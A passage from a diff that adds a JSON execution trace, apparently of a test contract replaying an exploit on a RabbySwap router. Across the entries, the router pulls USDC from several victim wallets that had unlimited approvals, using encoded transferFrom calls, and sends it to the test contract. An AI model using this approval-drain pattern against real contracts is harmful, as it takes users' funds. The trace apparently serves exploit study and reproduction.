+        "args": "0xAF22b1692dEe5929952cFBA4D9a74c0952C712C8, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 30487586 [3.048e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0xAF22b1692dEe5929952cFBA4D9a74c0952C712C8, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 30487586 [3.048e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0xFcdB212E7e7588D2dd2cc44C30F6C79fB507DB4B",
+        "original_code": null,
+        "description": null,
+        "return_value": "5185884 [5.185e6]"
+    },
+    {
+        "id": "2529",
+        "args": "0xFcdB212E7e7588D2dd2cc44C30F6C79fB507DB4B",
+        "original_code": null,
+        "description": null,
+        "return_value": "5185884 [5.185e6]"
+    },
+    {
+        "id": "3426",
+        "args": "0xFcdB212E7e7588D2dd2cc44C30F6C79fB507DB4B, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913114639935 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0xFcdB212E7e7588D2dd2cc44C30F6C79fB507DB4B, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913114639935 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd000000000000000000000000fcdb212e7e7588d2dd2cc44c30f6c79fb507db4b0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000004f215c, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0xFcdB212E7e7588D2dd2cc44C30F6C79fB507DB4B, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5185884 [5.185e6]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0xFcdB212E7e7588D2dd2cc44C30F6C79fB507DB4B, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5185884 [5.185e6]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0x9A93C5f7680724F6b7097085B0052A56D80615Bd",
+        "original_code": null,
+        "description": null,
+        "return_value": "5822890258 [5.822e9]"
+    },
+    {
+        "id": "2529",
+        "args": "0x9A93C5f7680724F6b7097085B0052A56D80615Bd",
+        "original_code": null,
+        "description": null,
+        "return_value": "5822890258 [5.822e9]"
+    },
+    {
+        "id": "3426",
+        "args": "0x9A93C5f7680724F6b7097085B0052A56D80615Bd, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0x9A93C5f7680724F6b7097085B0052A56D80615Bd, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd0000000000000000000000009a93c5f7680724f6b7097085b0052a56d80615bd0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000015b124112, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0x9A93C5f7680724F6b7097085B0052A56D80615Bd, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5822890258 [5.822e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0x9A93C5f7680724F6b7097085B0052A56D80615Bd, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5822890258 [5.822e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0x491968b05D95979BA3a52D73D8a39EA96693f011",
+        "original_code": null,
+        "description": null,
+        "return_value": "1905618393 [1.905e9]"
+    },
+    {
+        "id": "2529",
+        "args": "0x491968b05D95979BA3a52D73D8a39EA96693f011",
+        "original_code": null,
+        "description": null,
+        "return_value": "1905618393 [1.905e9]"
+    },
+    {
+        "id": "3426",
+        "args": "0x491968b05D95979BA3a52D73D8a39EA96693f011, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913059639935 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0x491968b05D95979BA3a52D73D8a39EA96693f011, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913059639935 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd000000000000000000000000491968b05d95979ba3a52d73d8a39ea96693f0110000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000071956dd9, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0x491968b05D95979BA3a52D73D8a39EA96693f011, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1905618393 [1.905e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0x491968b05D95979BA3a52D73D8a39EA96693f011, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1905618393 [1.905e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0xc64284527B04A48c6673dF62f5B48188Ccfdf658",
+        "original_code": null,
+        "description": null,
+        "return_value": "945764270 [9.457e8]"
+    },
+    {
+        "id": "2529",
+        "args": "0xc64284527B04A48c6673dF62f5B48188Ccfdf658",
+        "original_code": null,
+        "description": null,
+        "return_value": "945764270 [9.457e8]"
+    },
+    {
+        "id": "3426",
+        "args": "0xc64284527B04A48c6673dF62f5B48188Ccfdf658, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007911889445418 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0xc64284527B04A48c6673dF62f5B48188Ccfdf658, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007911889445418 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd000000000000000000000000c64284527b04a48c6673df62f5b48188ccfdf6580000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000385f37ae, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0xc64284527B04A48c6673dF62f5B48188Ccfdf658, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 945764270 [9.457e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0xc64284527B04A48c6673dF62f5B48188Ccfdf658, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 945764270 [9.457e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0x9df99a08710615FaBcb16Ea0b05ED039e8a5F644",
+        "original_code": null,
+        "description": null,
+        "return_value": "105496999 [1.054e8]"
+    },
+    {
+        "id": "2529",
+        "args": "0x9df99a08710615FaBcb16Ea0b05ED039e8a5F644",
+        "original_code": null,
+        "description": null,
+        "return_value": "105496999 [1.054e8]"
+    },
+    {
+        "id": "3426",
+        "args": "0x9df99a08710615FaBcb16Ea0b05ED039e8a5F644, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913027848260 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0x9df99a08710615FaBcb16Ea0b05ED039e8a5F644, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913027848260 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd0000000000000000000000009df99a08710615fabcb16ea0b05ed039e8a5f6440000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000649c1a7, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0x9df99a08710615FaBcb16Ea0b05ED039e8a5F644, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 105496999 [1.054e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0x9df99a08710615FaBcb16Ea0b05ED039e8a5F644, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 105496999 [1.054e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0xc897967Bab363caDD4F3001d51506bCc5DD6f6C2",
+        "original_code": null,
+        "description": null,
+        "return_value": "66164191 [6.616e7]"
+    },
+    {
+        "id": "2529",
+        "args": "0xc897967Bab363caDD4F3001d51506bCc5DD6f6C2",
+        "original_code": null,
+        "description": null,
+        "return_value": "66164191 [6.616e7]"
+    },
+    {
+        "id": "3426",
+        "args": "0xc897967Bab363caDD4F3001d51506bCc5DD6f6C2, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0xc897967Bab363caDD4F3001d51506bCc5DD6f6C2, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd000000000000000000000000c897967bab363cadd4f3001d51506bcc5dd6f6c20000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000003f195df, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0xc897967Bab363caDD4F3001d51506bCc5DD6f6C2, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 66164191 [6.616e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0xc897967Bab363caDD4F3001d51506bCc5DD6f6C2, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 66164191 [6.616e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0x48aa9d67cb713804C005516BCa7769c159d7897C",
+        "original_code": null,
+        "description": null,
+        "return_value": "11591216 [1.159e7]"
+    },
+    {
+        "id": "2529",
+        "args": "0x48aa9d67cb713804C005516BCa7769c159d7897C",
+        "original_code": null,
+        "description": null,
+        "return_value": "11591216 [1.159e7]"
+    },
+    {
+        "id": "3426",
+        "args": "0x48aa9d67cb713804C005516BCa7769c159d7897C, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007912809639935 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0x48aa9d67cb713804C005516BCa7769c159d7897C, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007912809639935 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd00000000000000000000000048aa9d67cb713804c005516bca7769c159d7897c0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000b0de30, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0x48aa9d67cb713804C005516BCa7769c159d7897C, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11591216 [1.159e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0x48aa9d67cb713804C005516BCa7769c159d7897C, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11591216 [1.159e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
